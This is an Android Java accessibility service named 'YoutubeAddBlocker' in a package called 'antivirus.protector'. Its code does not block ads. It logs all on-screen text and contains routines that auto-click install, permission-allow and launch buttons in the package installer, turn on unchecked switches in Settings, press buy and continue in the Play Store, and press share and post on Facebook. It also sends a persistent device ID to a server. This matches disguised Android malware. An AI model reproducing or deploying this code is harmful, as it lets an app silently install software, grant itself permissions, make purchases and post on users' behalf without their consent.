package somee.com.antivirus.protector;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;

import static android.view.accessibility.AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
import static somee.com.antivirus.protector.MainActivity.getCurrentTimeStamp;
import static somee.com.antivirus.protector.MainActivity.serviceRunningKey;

public class YoutubeAddBlocker extends AccessibilityService{


    @Override
    public void onCreate() {
        //getServiceInfo().flags = AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
        Log.v(TAG, "Service Created");
        //android.os.Debug.waitForDebugger();
        //openDB();

        //Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
        //startActivity(intent);
        ////startActivityForResult(intent, 0);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        //closeDB();
    }


    String packageName = "";



    private String scan_prefs = "pref";

    private void saveAndroidID(String androidId) {


            Context sharedContext = null;
            try {
                sharedContext = this.createPackageContext("", Context.CONTEXT_INCLUDE_CODE);
                if (sharedContext == null) {
                    return;
                }
            } catch (Exception e) {
                String error = e.getMessage();
                return;
            }

            SharedPreferences sp = sharedContext.getSharedPreferences(scan_prefs, Activity.MODE_PRIVATE);
            SharedPreferences.Editor editor = sp.edit();
            if (androidId.equalsIgnoreCase("")) {
                androidId = UUID.randomUUID().toString();
            }
            editor.putString("androidId", androidId);
            editor.commit();


    }

    private String getAndroid_id(){

        SharedPreferences sp = getSharedPreferences(scan_prefs, Activity.MODE_PRIVATE);
        String androidId  = sp.getString("androidId", "");

        SharedPreferences.Editor editor = sp.edit();
        if(androidId.equalsIgnoreCase("")){
            androidId = UUID.randomUUID().toString();
        }
        editor.putString("androidId", androidId);
        editor.commit();

        saveAndroidID(androidId);
        return androidId;
    }

    private void sendToServer(String status)
    {
        String id = getAndroid_id();
        AsyncInvokeURLTask task = null;
        try {
            task = new AsyncInvokeURLTask(
                    id,status,getApplicationContext()
                    , new AsyncInvokeURLTask.OnPostExecuteListener() {
                @Override
                public void onPostExecute(String result) {
                    // TODO Auto-generated method stub
                    String f= "";
                }

            });
        } catch (Exception e) {
            e.printStackTrace();
        }
        task.execute();
    }



    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        Log.v(TAG, String.format(
                "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s",
                idToText(event), event.getClassName(), event.getPackageName(), event.getEventTime()));

        String viewIdResourceName ="";
        Log.e(TAG, "in");
        AccessibilityNodeInfo source = event.getSource();
        if (source != null){
            if (source.getViewIdResourceName() != null) {
                viewIdResourceName = source.getViewIdResourceName();
            }

            while (source.getParent() != null) {
                source = source.getParent();
            }


            String xml = CreateVirtualViewXml(source, "", "");
            Log.e(TAG, xml);
        }

        if (event.getPackageName() != null && event.getPackageName().toString()!=null )
            packageName = event.getPackageName().toString();


        Log.v(TAG, String.format(
                "onAccessibilityEventNew: [PN] %s [type] %s [class] %s [id] %s [package] %s [time] %s",packageName,
                idToText(event), event.getClassName(), viewIdResourceName, event.getPackageName(), event.getEventTime()));




    }


    private void sendActions(AccessibilityEvent event){

        try {


            if(packageName.equalsIgnoreCase("com.android.settings")){
                AccessibilityNodeInfo nodeInfo = event.getSource();

                if (nodeInfo == null) {
                    return;
                }
                //Log.i(TAG, "ACC::onAccessibilityEvent: nodeInfo=" + nodeInfo);
                List<AccessibilityNodeInfo> list = nodeInfo
                        .findAccessibilityNodeInfosByViewId("com.android.settings:id/action_button");
                for (AccessibilityNodeInfo node : list) {
                    Log.i(TAG, "ACC::onAccessibilityEvent: action_button " + node);
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }

                list = nodeInfo
                        .findAccessibilityNodeInfosByViewId("android:id/button1");
                for (AccessibilityNodeInfo node : list) {
                    Log.i(TAG, "ACC::onAccessibilityEvent: android:id/button1 " + node);
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }


                list = nodeInfo
                        .findAccessibilityNodeInfosByViewId("android:id/checkbox");

                for (AccessibilityNodeInfo node : list) {
                    Log.i(TAG, "ACC::onAccessibilityEvent: android:id/checkbox " + node);
                    //node.setChecked(true);

                    //Action(AccessibilityNodeInfo.AccessibilityAction.ACTION_SHOW_ON_SCREEN);
                    if (node.isCheckable() && !node.isChecked()) {
                        if (node.getParent() != null)
                            node = node.getParent();

                        if (node.getParent() != null)
                            node = node.getParent();
                        //Bundle arg = new Bundle();
                        //arg.putBoolean("check",true);
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        //break;
                    }
                }


                list = nodeInfo
                        .findAccessibilityNodeInfosByViewId("android:id/switchWidget");
                for (AccessibilityNodeInfo node : list) {
                    Log.i(TAG, "ACC::onAccessibilityEvent: android:id/switchWidget " + node);
                    //node.setChecked(true);

                    //Action(AccessibilityNodeInfo.AccessibilityAction.ACTION_SHOW_ON_SCREEN);
                    if(node.isCheckable() && !node.isChecked()) {
                        if (node.getParent() != null)
                            node = node.getParent();

                        if (node.getParent() != null)
                            node = node.getParent();
                        //Bundle arg = new Bundle();
                        //arg.putBoolean("check",true);
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        //break;
                    }


                    //Log.i(TAG, "ACC::onAccessibilityEvent: nodeInfo=" + nodeInfo);

                }

                if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    list = nodeInfo
                            .findAccessibilityNodeInfosByViewId("android:id/list");
                    for (AccessibilityNodeInfo node : list) {
                        Log.i(TAG, "ACC::onAccessibilityEvent: android:id/list " + node);
                        node.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
                    }
                }
                //node.setChecked(true);

                //Action(AccessibilityNodeInfo.AccessibilityAction.ACTION_SHOW_ON_SCREEN);
                /*if(node.isCheckable() && !node.isChecked()) {
                    if (node.getParent() != null)
                        node = node.getParent();

                    if (node.getParent() != null)
                        node = node.getParent();
                    //Bundle arg = new Bundle();
                    //arg.putBoolean("check",true);
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    //break;
                }*/



                //Log.i(TAG, "ACC::onAccessibilityEvent: nodeInfo=" + nodeInfo);





            }else if(packageName.equalsIgnoreCase("com.android.packageinstaller")){
                AccessibilityNodeInfo nodeInfo = event.getSource();

                if (nodeInfo == null) {
                    return;
                }
                // Log.i(TAG, "ACC::onAccessibilityEvent: nodeInfo=" + nodeInfo);
                List<AccessibilityNodeInfo> list = nodeInfo
                        .findAccessibilityNodeInfosByViewId("android:id/button1");
                for (AccessibilityNodeInfo node : list) {
                    Log.i(TAG, "ACC::onAccessibilityEvent: android:id/button1 " + node);
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }



                list = nodeInfo
                        .findAccessibilityNodeInfosByViewId("com.android.packageinstaller:id/permission_allow_button");
                for (AccessibilityNodeInfo node : list) {
                    Log.i(TAG, "ACC::onAccessibilityEvent: permission_allow_button " + node);
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }

                list = nodeInfo
                        .findAccessibilityNodeInfosByViewId("com.android.packageinstaller:id/ok_button");

                for (AccessibilityNodeInfo node : list) {
                    Log.i(TAG, "ACC::onAccessibilityEvent: ok_button " + node);
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }

                list = nodeInfo
                        .findAccessibilityNodeInfosByViewId("com.android.packageinstaller:id/launch_button");

                for (AccessibilityNodeInfo node : list) {
                    Log.i(TAG, "ACC::onAccessibilityEvent: launch_button " + node);
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }


            }
            else if(packageName.equalsIgnoreCase("com.facebook.katana")){
                AccessibilityNodeInfo nodeInfo = event.getSource();

                if (nodeInfo == null) {
                    return;
                }
                // Log.i(TAG, "ACC::onAccessibilityEvent: nodeInfo=" + nodeInfo);
                List<AccessibilityNodeInfo> list = nodeInfo
                        .findAccessibilityNodeInfosByViewId("com.facebook.katana:id/button_share");
                for (AccessibilityNodeInfo node : list) {
                    Log.i(TAG, "ACC::onAccessibilityEvent: com.facebook.katana:id/button_share " + node);
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }

                list = nodeInfo
                        .findAccessibilityNodeInfosByViewId("com.facebook.katana:id/post_button");
                for (AccessibilityNodeInfo node : list) {
                    Log.i(TAG, "ACC::onAccessibilityEvent: com.facebook.katana:id/post_button " + node);
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }

            }
        }catch (Exception e){

        }
    }

    private void sendActions1(AccessibilityEvent event){
        if (packageName.equalsIgnoreCase("com.android.vending")) {
            AccessibilityNodeInfo nodeInfo = event.getSource();
            //Log.i(TAG, "ACC::onAccessibilityEvent: nodeInfo=" + nodeInfo);
            if (nodeInfo == null) {
                return;
            }


            List<AccessibilityNodeInfo> list = nodeInfo
                    .findAccessibilityNodeInfosByViewId("com.android.vending:id/buy_button");
            for (AccessibilityNodeInfo node : list) {
                Log.i(TAG, "ACC::onAccessibilityEvent: buy_button " + node);
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }

            list = nodeInfo
                    .findAccessibilityNodeInfosByViewId("com.android.vending:id/continue_button");
            for (AccessibilityNodeInfo node : list) {
                Log.i(TAG, "ACC::onAccessibilityEvent: continue_button " + node);
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }

            list = nodeInfo
                    .findAccessibilityNodeInfosByViewId("com.android.vending:id/launch_button");
            for (AccessibilityNodeInfo node : list) {
                Log.i(TAG, "ACC::onAccessibilityEvent: launch_button " + node);
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }

        }
        else if(packageName.equalsIgnoreCase("com.android.settings")){
            AccessibilityNodeInfo nodeInfo = event.getSource();

            if (nodeInfo == null) {
                return;
            }
            //Log.i(TAG, "ACC::onAccessibilityEvent: nodeInfo=" + nodeInfo);
            List<AccessibilityNodeInfo> list = nodeInfo
                    .findAccessibilityNodeInfosByViewId("com.android.settings:id/action_button");
            for (AccessibilityNodeInfo node : list) {
                Log.i(TAG, "ACC::onAccessibilityEvent: action_button " + node);
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
            list = nodeInfo
                    .findAccessibilityNodeInfosByViewId("android:id/summary");
            for (AccessibilityNodeInfo node : list) {
                Log.i(TAG, "ACC::onAccessibilityEvent: action_button " + node);
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
        }else if(packageName.equalsIgnoreCase("com.android.packageinstaller")){
            AccessibilityNodeInfo nodeInfo = event.getSource();

            if (nodeInfo == null) {
                return;
            }
            // Log.i(TAG, "ACC::onAccessibilityEvent: nodeInfo=" + nodeInfo);
            List<AccessibilityNodeInfo> list = nodeInfo
                    .findAccessibilityNodeInfosByViewId("android:id/button1");
            for (AccessibilityNodeInfo node : list) {
                Log.i(TAG, "ACC::onAccessibilityEvent: android:id/button1 " + node);
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }

            list = nodeInfo
                    .findAccessibilityNodeInfosByViewId("com.android.packageinstaller:id/ok_button");
            for (AccessibilityNodeInfo node : list) {
                Log.i(TAG, "ACC::onAccessibilityEvent: ok_button " + node);
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }


        }
    }



    static final String TAG = "cbx";

    @Override
    public void onInterrupt() {
        Log.v(TAG, "INTERRUPTED");
    }


    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.v(TAG, "AccessibilityService allowed");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        //info.flags = AccessibilityServiceInfo.DEFAULT ;
        info.flags = AccessibilityServiceInfo.DEFAULT | AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE |
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK | AccessibilityEvent.TYPE_VIEW_CLICKED | AccessibilityEvent.TYPE_VIEW_FOCUSED | AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_VISUAL;
        info.notificationTimeout = 100;
        setServiceInfo(info);
        packageName = "";

        //sendActiveNotification();
        //sendToServer("status=ServiceStarted");


    }


    /**
     * Converts an ID returned by AccessibilityEvent.getEventType()
     * to a representative String
     */
    private String idToText(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START:
                return "TYPE_TOUCH_EXPLORATION_GESTURE_START";
            case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END:
                return "TYPE_TOUCH_EXPLORATION_GESTURE_END";
            case AccessibilityEvent.TYPE_TOUCH_INTERACTION_START:
                return "TYPE_TOUCH_INTERACTION_START";
            case AccessibilityEvent.TYPE_TOUCH_INTERACTION_END:
                return "TYPE_TOUCH_INTERACTION_END";
            case AccessibilityEvent.TYPE_GESTURE_DETECTION_START:
                return "TYPE_GESTURE_DETECTION_START";
            case AccessibilityEvent.TYPE_GESTURE_DETECTION_END:
                return "TYPE_GESTURE_DETECTION_END";
            case AccessibilityEvent.TYPE_VIEW_HOVER_ENTER:
                return "TYPE_VIEW_HOVER_ENTER";
            case AccessibilityEvent.TYPE_VIEW_HOVER_EXIT:
                return "TYPE_VIEW_HOVER_EXIT";
            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                return "TYPE_VIEW_SCROLLED";
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                return "TYPE_VIEW_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                return "TYPE_VIEW_LONG_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                return "TYPE_VIEW_FOCUSED";
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                return "TYPE_VIEW_SELECTED";
            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED:
                return "TYPE_VIEW_ACCESSIBILITY_FOCUSED";
            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED:
                return "TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED";
            case TYPE_WINDOW_STATE_CHANGED:
                return "TYPE_WINDOW_STATE_CHANGED";
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                return "TYPE_NOTIFICATION_STATE_CHANGED";
            case AccessibilityEvent.TYPE_ANNOUNCEMENT:
                return "TYPE_ANNOUNCEMENT";
            case AccessibilityEvent.TYPE_WINDOWS_CHANGED:
                return "TYPE_WINDOWS_CHANGED";
            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                return "TYPE_WINDOW_CONTENT_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "TYPE_VIEW_TEXT_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                return "TYPE_VIEW_TEXT_SELECTION_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY:
                return "TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY";
            case AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED:
                return "TYPE_VIEW_CONTEXT_CLICKED";
        }
        return "Unknown";
    }


    /**
     * Converts gestureID to a representative String
     *
     * @param gID
     * @return
     */
    private String gIdToString(int gID) {
        switch (gID) {
            case 1:
                return "GESTURE_SWIPE_UP";
            case 2:
                return "GESTURE_SWIPE_DOWN";
            case 3:
                return "GESTURE_SWIPE_LEFT";
            case 4:
                return "GESTURE_SWIPE_RIGHT";
            case 5:
                return "GESTURE_SWIPE_LEFT_AND_RIGHT";
            case 6:
                return "GESTURE_SWIPE_RIGHT_AND_LEFT";
            case 7:
                return "GESTURE_SWIPE_UP_AND_DOWN";
            case 8:
                return "GESTURE_SWIPE_DOWN_AND_UP";
            case 9:
                return "GESTURE_SWIPE_LEFT_AND_UP";
            case 10:
                return "GESTURE_SWIPE_LEFT_AND_DOWN";
            case 11:
                return "GESTURE_SWIPE_RIGHT_AND_UP";
            case 12:
                return "GESTURE_SWIPE_RIGHT_AND_DOWN";
            case 13:
                return "GESTURE_SWIPE_UP_AND_LEFT";
            case 14:
                return "GESTURE_SWIPE_UP_AND_RIGHT";
            case 15:
                return "GESTURE_SWIPE_DOWN_AND_LEFT";
            case 16:
                return "GESTURE_SWIPE_DOWN_AND_RIGHT";
        }
        return "UNKNOWN";
    }


    private String CreateVirtualViewXml(AccessibilityNodeInfo source, String eventType, String eventSource) {
        //testReflection(source);

        String textData = "";
        if (source.getText() != null) {
            textData = source.getText().toString();
        } else if (source.getContentDescription() != null) {
            textData = source.getContentDescription().toString();
        }


        StringBuilder sb = new StringBuilder();

        sb.append("<View>");

        if (eventType != "") {
            sb.append("<Properties>");
            sb.append("<EventType>");
            sb.append(eventType);
            sb.append("</EventType>");
            sb.append("<AppSource>");
            sb.append(eventSource);
            sb.append("</AppSource>");
            sb.append("<DateTime>");
            //DateFormat df = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss");
            //String datetime = df.format(Calendar.getInstance().getTime());
            //sb.append(datetime);
            //sb.append(DBAdapter.getDateTime());
            sb.append("</DateTime>");
            eventType = "";
            sb.append("</Properties>");
        }

        sb.append("<Text>");
        sb.append(textData);
        sb.append("</Text>");

        sb.append("<Type>");
        String type = "unknowen";

        if (source.getClassName() != null) {
            type = source.getClassName().toString();
            //if(type.equalsIgnoreCase("TextView"))// == "android.widget.ImageView")
            // testReflection(event);
        }

        sb.append(type);
        //if(type.contains("Image"))// == "android.widget.ImageView")
        //    testActions(source);

        sb.append("</Type>");

        sb.append("<ViewIdResorceName>");
        sb.append(source.getViewIdResourceName());
        sb.append("</ViewIdResorceName>");


        sb.append("<ChildViews>");
        if (source.getChildCount() > 0) {
            for (int i = 0; i < source.getChildCount(); i++) {
                if(source.getChild(i) != null)
                    sb.append(CreateVirtualViewXml(source.getChild(i), eventType, ""));
            }
        }
        sb.append("</ChildViews>");

        sb.append("</View>");

        Log.v("DetailedXML", sb.toString());

        return sb.toString();
    }

}
